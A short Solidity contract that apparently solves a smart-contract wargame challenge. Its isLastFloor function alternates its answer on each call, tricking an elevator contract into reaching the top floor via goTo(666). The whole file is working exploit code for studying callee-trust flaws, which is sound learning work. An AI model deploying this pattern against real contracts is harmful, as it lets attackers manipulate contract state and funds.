// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../interfaces/Building.sol';

contract MagicBuilding is Building {

    bool private nextLastFloorState;

    function isLastFloor(uint) external returns (bool) {
        bool result = nextLastFloorState;
        nextLastFloorState = !nextLastFloorState;
        return result;
    }

    function goToLast(address elevatorAddress) external {
        nextLastFloorState = false;

        bytes memory encodedData = abi.encodeWithSignature("goTo(uint256)", uint(666));
        (bool result,) = elevatorAddress.call(encodedData);
        require(result, "Failed to call contract function.");
    }

}
